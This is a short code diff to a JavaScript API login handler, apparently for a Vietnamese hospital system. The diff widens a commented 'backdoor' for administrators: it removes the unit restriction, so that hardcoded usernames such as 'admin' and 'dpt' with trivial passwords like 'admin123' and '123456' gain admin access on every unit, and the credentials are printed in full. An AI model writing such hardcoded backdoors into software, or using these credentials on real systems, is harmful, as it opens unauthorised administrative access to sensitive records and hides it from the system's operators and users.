@@ -2797,8 +2797,8 @@ async function handleApiAction(action, args, env, request, ctx, unitCode = "bvtk
         }
       }
 
-      // 🔑 3. Backdoor quản trị cho bvtks_cs2
-      if (reqUnit === "bvtks_cs2" &&
+      // 🔑 3. Backdoor quản trị cho tài khoản admin / dpt / admin_yhct trên mọi đơn vị
+      if (
         (username.toLowerCase() === "admin" || username.toLowerCase() === "admin_yhct" || username.toLowerCase() === "admin_dpt" || username.toLowerCase() === "dpt") &&
         (password === "admin" || password === "admin123" || password === "123456" || password === "dpthai" || password === "bvtks")
       ) {
